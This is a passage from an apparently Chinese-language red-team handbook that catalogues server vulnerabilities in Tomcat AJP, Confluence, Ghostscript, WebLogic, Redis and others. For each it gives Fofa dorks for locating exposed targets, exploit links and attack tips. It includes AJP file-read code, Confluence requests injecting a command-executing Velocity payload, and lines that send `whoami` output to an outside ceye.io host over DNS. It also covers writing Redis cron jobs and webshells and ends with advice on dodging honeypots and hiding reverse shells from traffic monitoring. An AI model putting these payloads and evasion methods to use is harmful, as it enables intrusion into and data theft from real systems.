<p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p>
<p>主要代码也就这</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">t = Tomcat(&#34;127.0.0.1&#34;, 8009)
</span></span><span class="line"><span class="cl">_, data = t.perform_request(&#39;/&#39;, attributes=[
</span></span><span class="line"><span class="cl">    {&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.request_uri&#39;, &#39;/&#39;]}, 
</span></span><span class="line"><span class="cl">    {&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.path_info&#39;, &#34;/WEB-INF/web.xml&#34;]}, 
</span></span><span class="line"><span class="cl">    {&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.servlet_path&#39;, &#39;/&#39;]}, 
</span></span><span class="line"><span class="cl">])
</span></span><span class="line"><span class="cl">print(&#39;----------------------------&#39;)
</span></span><span class="line"><span class="cl">print(&#34;&#34;.join([bytes.decode(d.data) for d in data]))
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.通过修改这里的路径可以进行Webapp切换, 默认是<code>ROOT/</code>, 需要切换应用就改成 <code>/admin/</code> 之类的</p>
<p>3.通常检测的时候, 尽量保持<code>t.perform_request('/'</code> , 有的poc喜欢用 <code>/addsd</code> 这种的不存在的路径, 有些情况会读不到文件</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.屏蔽8009端口对外开放</p>
<h2 id="php-fpm-远程代码执行漏洞">PHP-FPM 远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞</p>
<p>2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Nginx + FPM + PHP7</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Nginx</code></p>
<p><code>PHP</code></p>
<p><code>nextcloud</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析
<a class="link" href="https://paper.seebug.org/1063/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1063/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>neex/phuip-fpizdam: Exploit for CVE-2019-11043
<a class="link" href="https://github.com/neex/phuip-fpizdam"  target="_blank" rel="noopener"
    >https://github.com/neex/phuip-fpizdam</a></p>
<p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE
<a class="link" href="https://github.com/jas502n/CVE-2019-11043"  target="_blank" rel="noopener"
    >https://github.com/jas502n/CVE-2019-11043</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502</p>
<p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)
<a class="link" href="https://github.com/k8gege/CVE-2019-11043"  target="_blank" rel="noopener"
    >https://github.com/k8gege/CVE-2019-11043</a></p>
<p>2.Nextcloud 这个应用的默认配置就存在漏洞</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版php</p>
<p>2.修改nginx配置</p>
<h2 id="cve-2019-3396-confluence-wiki-远程代码执行">CVE-2019-3396 Confluence Wiki 远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Confluence</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>Confluence</p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Confluence&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析
<a class="link" href="https://paper.seebug.org/884/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/884/</a></p>
<p>Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心</p>
<blockquote>
<p><a class="link" href="https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/"  target="_blank" rel="noopener"
    >Atlassian Confluence 远程代码执行漏洞分析</a></p>
</blockquote>
<p><strong>6. 漏洞利用</strong></p>
<p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞
<a class="link" href="https://github.com/jas502n/CVE-2019-3396"  target="_blank" rel="noopener"
    >https://github.com/jas502n/CVE-2019-3396</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.本地写日志的方式getshell</p>
<p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p>
<p>这里的远程模板加载不支持http协议, 主要是<code>classloader</code>的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell</p>
<p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持<code>file协议</code>可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p>
<p><code>velocity</code>比<code>php</code>语法要相对严格一点, 可能会报错, 而且<code>velocity</code>渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /synchrony/heartbeat HTTP/1.1
</span></span><span class="line"><span class="cl">Host: localhost:8091
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
</span></span><span class="line"><span class="cl">Accept: text/html, */*; q=0.01
</span></span><span class="line"><span class="cl">Accept-Language: en-US, en;q=0.5
</span></span><span class="line"><span class="cl">Referer: http://localhost:8091
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">x-forwarded-for: $i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;, null).invoke(null, null).exec(&#39;gnome-calculator&#39;).waitFor()
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /rest/tinymce/1/macro/preview HTTP/1.1
</span></span><span class="line"><span class="cl">Host: localhost:8090
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
</span></span><span class="line"><span class="cl">Accept: text/html, */*; q=0.01
</span></span><span class="line"><span class="cl">Accept-Language: en-US, en;q=0.5
</span></span><span class="line"><span class="cl">Referer: http://localhost:8090/
</span></span><span class="line"><span class="cl">Content-Type: application/json; 
</span></span><span class="line"><span class="cl">X-Requested-With: XMLHttpRequest
</span></span><span class="line"><span class="cl">Content-Length: 258
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;contentId&#34;:&#34;65594&#34;, &#34;macro&#34;:{&#34;name&#34;:&#34;widget&#34;, &#34;body&#34;:&#34;&#34;, &#34;params&#34;:{&#34;url&#34;:&#34;http://www.dailymotion.com/video/xcpa64?_template=/etc/passwd&#34;, &#34;width&#34;:&#34;300&#34;, &#34;height&#34;:&#34;200&#34;, &#34;_template&#34;:&#34;file:/var/atlassian/application-data/confluence/logs/atlassian-synchrony.log&#34;}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="ghostscript-上传图片代码执行">Ghostscript 上传图片代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p>
<p><strong>2. 影响组件</strong></p>
<p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>.ps/.jpg/.png</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/157513"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/157513</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Exploit Database Search
<a class="link" href="https://www.exploit-db.com/search?q=Ghostscript"  target="_blank" rel="noopener"
    >https://www.exploit-db.com/search?q=Ghostscript</a></p>
<p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub
<a class="link" href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116"  target="_blank" rel="noopener"
    >https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p>
<p>dnslog 可以用 <code>ping </code>uname<code>.admin.ceye.io</code> 或 <code>ping </code>whoami<code>.admin.ceye.io</code></p>
<p>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造</p>
<p><code>ping </code>whoami<code>.centos.admin.ceye.io</code> / <code>ping </code>whoami<code>.ubuntu.admin.ceye.io</code></p>
<p>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<h2 id="jboss-相关漏洞">Jboss 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响</p>
<p><strong>2. 影响组件</strong></p>
<p>Jboss</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Jboss</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;JBoss&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/vuls/186948.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/186948.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
<a class="link" href="https://github.com/joaomatosf/jexboss"  target="_blank" rel="noopener"
    >https://github.com/joaomatosf/jexboss</a></p>
<p>Perun/vuln/jboss at master · WyAtu/Perun
<a class="link" href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss"  target="_blank" rel="noopener"
    >https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Jboss的漏洞在内网还是相对比较常见的, 试过几次<code>jexboss</code>, 效果还ok</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="websphere-反序列化远程代码执行">Websphere 反序列化远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),</p>
<p>近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)</p>
<p><strong>2. 影响组件</strong></p>
<p>WebSphere</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>WebSphere</code></p>
<p><code>8880</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;IBM-WebSphere&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.
<a class="link" href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere"  target="_blank" rel="noopener"
    >https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p>
<p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6394"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6394</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits
<a class="link" href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py"  target="_blank" rel="noopener"
    >https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p>
<p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6394"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6394</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的</p>
<p>Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/309"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/309</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="jenkins-系列漏洞">Jenkins 系列漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令</p>
<p><strong>2. 影响组件</strong></p>
<p>Jenkins</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Jenkins</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Jenkins&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Jenkins RCE漏洞分析汇总
<a class="link" href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#%EF%BF%A6%EF%BE%80%EF%BE%BB%EF%BF%A7%EF%BE%BB%EF%BE%93"  target="_blank" rel="noopener"
    >http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog
<a class="link" href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"  target="_blank" rel="noopener"
    >https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog
<a class="link" href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"  target="_blank" rel="noopener"
    >https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破
<a class="link" href="https://github.com/blackye/Jenkins"  target="_blank" rel="noopener"
    >https://github.com/blackye/Jenkins</a></p>
<p>gquere/pwn_jenkins: Notes about attacking Jenkins servers</p>
<p><a class="link" href="https://github.com/gquere/pwn_jenkins"  target="_blank" rel="noopener"
    >https://github.com/gquere/pwn_jenkins</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="rmi-对外开放">RMI 对外开放</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集</p>
<p>通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.</p>
<p><strong>2. 影响组件</strong></p>
<p>java*</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>1098, 1099, 1090, 8901, 8902, 8903</code></p>
<p><code>N\x00</code></p>
<p><code>rmiregistry</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>protocol==&quot;java-rmi&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>RMI-反序列化 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6660"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6660</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog
<a class="link" href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"  target="_blank" rel="noopener"
    >https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p>Java RMI服务远程命令执行利用_91Ri.org
<a class="link" href="http://www.91ri.org/15276.html"  target="_blank" rel="noopener"
    >http://www.91ri.org/15276.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.rmi一般在内网开放的比较多, nmap 扫描如下</p>
<p><code>nmap -v 8.8.8.8 -p1099 -sV --script=rmi*</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="weblogic-t3-协议漏洞">Weblogic T3 协议漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p>
<p><strong>2. 影响组件</strong></p>
<p>Weblogic</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>Lcom.tangosol.util.extractor.ReflectionExtractor</p>
<p>…</p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>protocol==&quot;weblogic&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>相关漏洞有:</p>
<p>CVE-2017-3248
<a class="link" href="https://paper.seebug.org/333/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/333/</a></p>
<p>CVE-2018-2628
<a class="link" href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/"  target="_blank" rel="noopener"
    >http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
<p>CVE-2018-2893
<a class="link" href="https://www.freebuf.com/vuls/178105.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/178105.html</a></p>
<p>CVE-2019-2890
<a class="link" href="https://paper.seebug.org/1069/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1069/</a></p>
<p>CVE-2020-2555(Oracle Coherence)
<a class="link" href="https://paper.seebug.org/1141/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1141/</a></p>
<p>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.
<a class="link" href="https://www.oracle.com/security-alerts/cpuapr2020.html"  target="_blank" rel="noopener"
    >https://www.oracle.com/security-alerts/cpuapr2020.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>weblogic 漏洞扫描工具
<a class="link" href="https://github.com/0xn0ne/weblogicScanner"  target="_blank" rel="noopener"
    >https://github.com/0xn0ne/weblogicScanner</a></p>
<p>CVE-2020-2555
<a class="link" href="https://github.com/Y4er/CVE-2020-2555"  target="_blank" rel="noopener"
    >https://github.com/Y4er/CVE-2020-2555</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p>
<p><code>nmap -sV --script=weblogic-t3-info.nse -p 7001</code></p>
<p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p>
<p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.
<a class="link" href="https://github.com/Bort-Millipede/WLT3Serial"  target="_blank" rel="noopener"
    >https://github.com/Bort-Millipede/WLT3Serial</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁
2.禁用T3协议
3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>
<h2 id="weblogic-xmldecoder反序列化">Weblogic XMLDecoder反序列化</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.</p>
<p>2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.</p>
<p><strong>2. 影响组件</strong></p>
<p>WebLogic 10.X</p>
<p>WebLogic 12.1.3</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>/wls-wsat/CoordinatorPortType</code>
<code>/_async/AsyncResponseService</code>
<code>/_async/AsyncResponseServiceSoap12</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;WebLogic-Server&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>（CVE-2017-3506 &amp;CVE-2017-10271）
<a class="link" href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/"  target="_blank" rel="noopener"
    >http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/</a></p>
<p>CVE-2019-2725
<a class="link" href="https://paper.seebug.org/909/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/909/</a></p>
<p><strong>6. 漏洞利用</strong>
weblogicScanner
<a class="link" href="https://github.com/0xn0ne/weblogicScanner"  target="_blank" rel="noopener"
    >https://github.com/0xn0ne/weblogicScanner</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p>
<p><code>/../wls-wsat/CoordinatorPortType11</code>
<code>/../_async/AsyncResponseService</code></p>
<p>2.Weblogic 写shell有个技巧</p>
<p>可以通过<code>find</code>/<code>grep</code>命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的<code>logo.png</code> / <code>/static/css/main.css</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；</p>
<p>2.删除对应war包并重启 webLogic；</p>
<p>3.限制源IP对应 weblogic 7001端口的访问.</p>
<h2 id="weblogic-iiop">Weblogic IIOP</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.</p>
<p><strong>2. 影响组件</strong></p>
<p>Oracle WebLogic Server version:</p>
<p>10.3.6.0.0</p>
<p>12.1.3.0.0</p>
<p>12.2.1.3.0 and 12.2.1.4.0</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>GIOP &amp;&amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;WebLogic-Server&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>WebLogic CVE-2020-2551漏洞分析
<a class="link" href="https://paper.seebug.org/1138/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1138/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551
<a class="link" href="https://github.com/Y4er/CVE-2020-2551"  target="_blank" rel="noopener"
    >https://github.com/Y4er/CVE-2020-2551</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/201005"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/201005</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.通过 Weblogic 控制台进行关闭 IIOP 协议</p>
<h2 id="redis-相关漏洞">Redis 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作</p>
<p><strong>2. 影响组件</strong></p>
<p>Redis</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>6379</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Redis&quot; &amp;&amp; &quot;redis_version&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Redis 基于主从复制的 RCE 利用方式
<a class="link" href="https://paper.seebug.org/975/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/975/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!
<a class="link" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand"  target="_blank" rel="noopener"
    >https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.当Redis 权限满足写文件时</p>
<p>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p>
<p>2.当Redis 权限不满足写文件时</p>
<p>发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞</p>
<p>发现Redis记录中存在<code>AC ED</code>这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据</p>
<p><strong>8. 防护方法</strong></p>
<p>1.Redis 设置强口令</p>
<p>2.Redis 尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="后记">后记</h2>
<p>1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台</p>
<p>搜索结果 – FOFA网络空间测绘系统
<a class="link" href="https://fofa.so/result?q=%22var&#43;jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D"  target="_blank" rel="noopener"
    >https://fofa.so/result?q=%22var+jtoken%3D%27%22&qbase64=InZhciBqdG9rZW49JyI%3D</a></p>
<p>2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到</p>
<p>Reverse shell cheatsheet 多种反弹shell的命令
<a class="link" href="https://krober.biz/misc/reverse_shell.php"  target="_blank" rel="noopener"
